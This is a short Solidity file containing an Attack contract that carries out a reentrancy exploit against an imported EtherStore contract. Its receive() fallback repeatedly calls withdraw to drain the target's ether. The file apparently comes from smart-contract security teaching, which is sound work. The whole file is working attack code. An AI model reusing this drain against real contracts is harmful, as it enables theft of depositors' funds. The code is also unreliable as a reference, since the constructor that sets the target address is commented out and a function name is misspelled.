// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // constructor(address _etherStoreAddress) public {
    //     etherStore = EtherStore(_etherStoreAddress);
    // }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposite{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns(uint) {
        return address(etherStore).balance;
    }
}